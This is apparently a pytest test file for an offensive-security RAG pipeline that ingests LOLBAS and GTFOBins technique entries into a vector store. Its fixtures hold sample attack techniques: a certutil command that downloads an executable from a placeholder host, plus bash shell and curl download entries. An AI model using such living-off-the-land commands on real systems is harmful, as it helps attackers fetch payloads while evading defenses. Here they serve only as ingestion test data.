import pytest
from pathlib import Path
from unittest.mock import MagicMock, patch

from cyberred.rag.sources import lolbas
from cyberred.rag.store import RAGStore
from cyberred.rag.embeddings import RAGEmbeddings


def _create_lolbas_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "lolbas"
    yml_dir = repo / "yml" / "OSBinaries"
    yml_dir.mkdir(parents=True)

    (yml_dir / "Certutil.yml").write_text(
        """
Name: Certutil.exe
Description: Download helper
Commands:
  - Command: certutil.exe -urlcache -split -f http://example.com/file.exe file.exe
    Description: Download file
    MitreID: T1105
""",
        encoding="utf-8",
    )

    return repo


def _create_gtfobins_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "gtfobins"
    gdir = repo / "_gtfobins"
    gdir.mkdir(parents=True)

    (gdir / "bash.md").write_text(
        """---
functions:
  shell:
    - code: bash
  file-download:
    - code: curl http://example.com
---

Body\n""",
        encoding="utf-8",
    )

    return repo


@pytest.mark.integration
@pytest.mark.asyncio
async def test_lolbas_ingest_flow(tmp_path, monkeypatch):
    lol_repo = _create_lolbas_repo(tmp_path)
    gtf_repo = _create_gtfobins_repo(tmp_path)

    db_path = tmp_path / "lancedb"
    store = RAGStore(store_path=str(db_path))

    embeddings = MagicMock(spec=RAGEmbeddings)
    embeddings.encode_batch.side_effect = lambda texts: [[0.1] * 768 for _ in texts]

    monkeypatch.setattr(lolbas, "DEFAULT_LOLBAS_CACHE_DIR", tmp_path / "cache_lol")
    monkeypatch.setattr(lolbas, "DEFAULT_GTFOBINS_CACHE_DIR", tmp_path / "cache_gtfo")

    with (
        patch("cyberred.rag.sources.lolbas._download_lolbas", return_value=lol_repo),
        patch("cyberred.rag.sources.lolbas._download_gtfobins", return_value=gtf_repo),
    ):
        stats = await lolbas.ingest(store=store, embeddings=embeddings, incremental=False)

    assert stats.source == "lolbas"
    assert stats.chunk_count >= 1

    results = await store.search([0.1] * 768, top_k=100)
    assert len(results) >= 1
    # both sources stored under source="lolbas" because pipeline source is lolbas
    assert all(r.source == "lolbas" for r in results)


@pytest.mark.integration
@pytest.mark.asyncio
async def test_lolbas_incremental_skips_unchanged(tmp_path, monkeypatch):
    lol_repo = _create_lolbas_repo(tmp_path)
    gtf_repo = _create_gtfobins_repo(tmp_path)

    db_path = tmp_path / "lancedb"
    store = RAGStore(store_path=str(db_path))

    embeddings = MagicMock(spec=RAGEmbeddings)
    embeddings.encode_batch.side_effect = lambda texts: [[0.1] * 768 for _ in texts]

    monkeypatch.setattr(lolbas, "DEFAULT_LOLBAS_CACHE_DIR", tmp_path / "cache_lol")
    monkeypatch.setattr(lolbas, "DEFAULT_GTFOBINS_CACHE_DIR", tmp_path / "cache_gtfo")

    with (
        patch("cyberred.rag.sources.lolbas._download_lolbas", return_value=lol_repo),
        patch("cyberred.rag.sources.lolbas._download_gtfobins", return_value=gtf_repo),
    ):
        stats1 = await lolbas.ingest(store=store, embeddings=embeddings, incremental=False)
        initial = stats1.chunk_count

        stats2 = await lolbas.ingest(store=store, embeddings=embeddings, incremental=True)

    results = await store.search([0.1] * 768, top_k=200)
    assert len(results) == initial
    assert stats2.chunk_count in (0, initial)


@pytest.mark.integration
@pytest.mark.asyncio
async def test_lolbas_force_refresh_pass_through(tmp_path, monkeypatch):
    lol_repo = _create_lolbas_repo(tmp_path)
    gtf_repo = _create_gtfobins_repo(tmp_path)

    db_path = tmp_path / "lancedb"
    store = RAGStore(store_path=str(db_path))

    embeddings = MagicMock(spec=RAGEmbeddings)
    embeddings.encode_batch.side_effect = lambda texts: [[0.1] * 768 for _ in texts]

    monkeypatch.setattr(lolbas, "DEFAULT_LOLBAS_CACHE_DIR", tmp_path / "cache_lol")
    monkeypatch.setattr(lolbas, "DEFAULT_GTFOBINS_CACHE_DIR", tmp_path / "cache_gtfo")

    with (
        patch("cyberred.rag.sources.lolbas._download_lolbas", return_value=lol_repo) as mock_lol,
        patch("cyberred.rag.sources.lolbas._download_gtfobins", return_value=gtf_repo) as mock_gtfo,
    ):
        await lolbas.ingest(store=store, embeddings=embeddings, force_refresh=False)
        await lolbas.ingest(store=store, embeddings=embeddings, force_refresh=True)

    assert mock_lol.call_count == 2
    assert mock_lol.call_args[1].get("force_refresh") is True
    assert mock_gtfo.call_count == 2
    assert mock_gtfo.call_args[1].get("force_refresh") is True
